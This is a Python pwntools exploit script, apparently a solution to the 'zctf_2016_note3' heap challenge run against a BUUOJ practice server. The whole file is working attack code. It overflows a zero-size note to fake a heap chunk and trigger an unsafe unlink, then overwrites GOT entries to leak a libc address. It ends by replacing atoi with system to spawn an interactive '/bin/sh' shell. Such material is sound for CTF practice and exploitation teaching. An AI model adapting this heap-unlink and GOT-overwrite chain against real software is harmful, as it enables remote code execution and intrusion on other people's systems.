#!//usr/bin/python
#-*- coding:utf-8-*-
from pwn import *
context.binary = ELF("./zctf_2016_note3")
context.log_level = 'debug'
elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0x400D47')
	raw_input()

def menu(ch):
	p.sendlineafter('option--->>', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('1024)', str(size))
	p.sendlineafter('content', content)
	print "add a chunk!"

def free(idx):
	menu(4)
	p.sendlineafter('note', str(idx))


def edit(idx, content):
	menu(3)
	p.sendlineafter('note', str(idx))
	p.sendlineafter('content', content)
	print "edit %d chunk !" % idx

def exploit():
	
	ptr = 0x6020C8

	add(0, 'a')			#which is used to modify
	add(0x100, 'b')
	add(0x100, 'c')
	add(0x100, 'd')

	payload = p64(0) + p64(0x120) + p64(ptr - 0x18) + p64(ptr-0x10)		#fake head
	payload = payload.ljust(0x120, 'a')
	payload += p64(0x120) + p64(0x110)					#fake inuse
	edit(0, payload)
	free(2)

	#head[0] = head[-3]

	#head[1] = free_got ==> puts_plt
	#head[2] = read_got

	edit(0, 'a'*0x18 + p64(ptr-0x18) + p64(elf.got['free']) + p64(elf.got['read']) + p64(elf.got['atoi']))
	edit(1, p64(elf.plt['puts'])[:6])					#avoid '\x00' cover puts_got
	free(2)
	p.recvline()
	read_addr = u64(p.recvline().strip().ljust(8, '\x00'))
	libc_base = read_addr - libc.symbols['read']
	print "read_addr ==> " + hex(read_addr)
	libc_base = read_addr - libc.symbols['read']

	system = libc.symbols['system'] + libc_base
	edit(3, p64(system))
	#dbg()
	menu("/bin/sh\x00")
	p.interactive()
	p.close()


if __name__ == '__main__':
	#p = process("./zctf_2016_note3")
	p = remote('node3.buuoj.cn', 29524)
	exploit()